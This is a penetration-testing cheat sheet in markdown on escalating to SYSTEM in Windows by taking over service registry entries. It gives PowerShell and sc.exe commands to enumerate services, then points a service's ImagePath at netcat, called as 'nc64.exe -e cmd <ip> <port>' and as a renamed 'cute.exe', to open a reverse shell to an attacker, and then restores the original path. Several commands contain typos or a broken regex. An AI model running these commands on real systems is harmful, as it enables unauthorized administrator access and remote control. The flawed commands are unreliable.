## Verify rights on registry

- If a user have full control over registries, it's possible to start some services with Localsystem rights, so with a reverse shell, you'll be logged as administrator.

- Two ways of checking :
```
$acl = get-acl HKLM:\System\CurrentControlSet\Services
```
- To translate sddl (Security Description Definition Language), two choices : 
`ConvertFrom-SddlString -Sddl $acl.Sddl | Foreach-Object {$_DiscrtionaryAcl}`, or  https://github.com/itsKindred/sdshow_parse

- Another way of checking : `accesschk64.exe /accepteula "<user>" -kwsu HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services`

- If you have full control, it's over.

- Store all the services in a variable : `$services = gci  hklm:\system\curentcontroluser\services`

- Next step : two choices :
1. Find a service running, owned by LocalSystem with no dependencies to escalate your priviledge and wait for a restart
or
2. Find a service stopped, owned by LocalSystem with no dependecies to escalate priviledge and authenticated user is able to start the service.

- Option 2:
1. List the services : `$services = gci -name HKLM:\System\CurrentControlSet\Services`. Here name is used to extract only the object Name.
2. `$sddl = (sc.exe sdshow $service)[1]; if ($sddl -match "RP[A-Z]*?;;;AU") { write-host $service }`. Here we extract the sddl of each service, and then use a regex to match RP (Read Property) for AU saying that an authenticated user can start the service.
3. Find a stopped service : `$state = (sc.exe query service)[3]; if ($state -match "STOPPED") { write-host $service }`
4. Find a service without dependencies : `$dependencies = (sc.exe qc $service)[10]; if ($dependencies -match ": (?![A-Za-z)" { write-host $service }`
5. Owned by LocalSystem : `$admin = (sc.exe qc $service)[11]; if ($admin -match "LocalSystem") { write-host $service }`
6. Put everything in a foreach and here we are ! `foreach($service in $services) { $sddl = (sc.exe sdshow $service)[1]; $state = (sc.exe query service)[3]; $dependencies = (sc.exe qc $service)[10]; $admin = (sc.exe qc $service)[11]; if ($admin -match "LocalSystem" -and $dependencies -match ": (?![A-Za-z])" -and $state -match "STOPPED" -and $sddl -match "RP[A-Z]*?;;;AU") { write-host $service }} `

- Once you have the desired service, modify the registry :
```
REG DELETE HKLM\SYSTEM\CURRENTCONTROLSET\Services\<service> /v ImagePath /f
REG ADD HKLM\SYSTEM\CURRENTCONTROLSET\Services\<service> /v ImagePath /t REG_SZ /d "%WINDIR%\System32\cmd.exe /c start %WINDIR%\system32\spool\drivers\color\cute.exe <ip> <port> -e cmd.exe" /f
sc start <service>
```

- or : 
```
$old_path = (get-itemproperty HKLM:\system\currentcontrolset\services\wuauserv).ImagePath; 

set-itemproperty -erroraction silentlycontinue -path HKLM:\system\currentcontrolset\services\<service> -name imagepath -value "\windows\system32\spool\drivers\color\nc64.exe -e cmd <ip> <port>"; 
start-service $service -erroraction silentlycontinue; 
set-itemproperty -path HKLM:\system\currentcontrolset\services\<service> -name imagepath -value $old_path 
```

- Connection are unstable after hijack a process or an ImagePath of a service, so always get another shell after you get a connection.








